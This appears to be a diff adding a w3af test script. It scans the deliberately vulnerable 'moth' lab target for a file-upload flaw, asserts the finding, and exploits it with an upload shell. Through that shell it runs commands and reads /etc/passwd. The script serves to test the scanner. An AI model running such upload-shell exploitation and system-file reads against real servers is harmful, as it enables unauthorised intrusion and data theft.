@@ -1,0 +1,41 @@
+# This is a test for file uploads
+
+plugins
+output console,textFile
+output config textFile
+set fileName output-w3af.txt
+set verbose True
+back
+output config console
+set verbose False
+back
+
+audit fileUpload
+back
+
+target
+set target http://moth/w3af/audit/file_upload/
+back
+
+start
+
+assert len( kb.kb.getData('fileUpload', 'fileUpload') ) == 1
+
+exploit
+exploit fileUploadShell
+interact 0
+
+execute w
+execute ls
+read /etc/passwd
+payload uptime
+payload users
+payload tcp
+
+exit
+
+back
+
+assert len( kb.kb.getData('fileUploadShell', 'shell') ) == 1
+
+exit
